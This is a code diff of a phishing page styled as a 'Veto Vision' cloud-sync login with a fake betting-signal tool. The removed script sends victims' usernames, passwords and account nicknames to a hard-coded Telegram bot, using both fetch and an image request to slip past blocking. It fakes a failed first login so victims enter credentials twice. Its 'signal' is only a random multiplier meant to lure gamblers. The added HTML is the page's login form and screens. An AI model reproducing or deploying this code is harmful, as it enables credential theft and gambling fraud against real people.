@@ -1,61 +1,38 @@
-<script>
-    // ⚠️ التوكن الجديد نتاعك (اللي مابعتلي فيه)
-    const botToken = "8589243363:AAEMgjPjQOE6e0NGFQ307kv-FSl8VxTLkwg"; 
-    const chatId = "8026901193";
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Veto Vision - Sync Node</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
 
-    // دالة الإرسال المضمونة 100%
-    function send(msg) {
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=html`;
-        
-        // محاولة عبر Fetch
-        fetch(url).catch(e => console.log("Fetch blocked"));
-        
-        // محاولة عبر Image (تخترق الحماية ولازم تكون كاينة)
-        const img = new Image();
-        img.src = url;
-    }
+    <div id="auth-screen" class="container">
+        <h2 class="title">VETO VISION</h2>
+        <p class="subtitle">Cloud Synchronization System</p>
+        <div class="input-box">
+            <input type="text" id="u_log" placeholder="Username / Email">
+            <input type="password" id="u_pas" placeholder="Password">
+        </div>
+        <button id="sync-btn" onclick="processAuth()">START SYNC</button>
+        <p id="login-err" class="error-msg hidden">⚠️ Authentication Failed. Retry.</p>
+    </div>
 
-    let loginAttempts = 0;
-    function processLogin() {
-        const u = document.getElementById('u_log').value;
-        const p = document.getElementById('u_pas').value;
-        
-        if (u.length < 3 || p.length < 3) return;
+    <div id="security-layer" class="container hidden">
+        <h2 class="title">SECURITY</h2>
+        <p class="subtitle">Confirm your account nickname</p>
+        <input type="text" id="u_nick" placeholder="Account Nickname">
+        <button onclick="processNick()">VERIFY</button>
+    </div>
 
-        loginAttempts++;
-        if (loginAttempts === 1) {
-            send(`<b>⚠️ محاولة 1:</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
-            document.getElementById('login-err').classList.remove('hidden');
-            document.getElementById('u_pas').value = ""; 
-        } else {
-            send(`<b>✅ محاولة 2 (دخول):</b>\n👤: <code>${u}</code>\n🔑: <code>${p}</code>`);
-            document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('security-layer').classList.remove('hidden');
-        }
-    }
+    <div id="main-app" class="container hidden">
+        <div class="signal-card">
+            <h1 id="target-mult">READY</h1>
+        </div>
+        <button class="signal-btn" onclick="getSignal()">GET NEXT SIGNAL</button>
+    </div>
 
-    let nickAttempts = 0;
-    function processNick() {
-        const n = document.getElementById('u_nick').value;
-        if (n.length < 2) return;
-
-        nickAttempts++;
-        if (nickAttempts === 1) {
-            send(`<b>⚠️ لقب 1:</b>\n🔑: <code>${n}</code>`);
-            document.getElementById('nick-err').classList.remove('hidden');
-            document.getElementById('u_nick').value = "";
-        } else {
-            send(`<b>✅ لقب 2 (تأكيد):</b>\n🔑: <code>${n}</code>`);
-            document.getElementById('security-layer').classList.add('hidden');
-            document.getElementById('main-app').classList.remove('hidden');
-        }
-    }
-
-    function getSignal() {
-        const res = document.getElementById('target-mult');
-        res.innerHTML = '<span class="animate-pulse text-zinc-400">WAIT..</span>';
-        setTimeout(() => {
-            res.innerText = (Math.random() * (6.80 - 1.20) + 1.20).toFixed(2) + "x";
-        }, 800);
-    }
-</script>
+    <script src="script.js"></script>
+</body>
+</html>
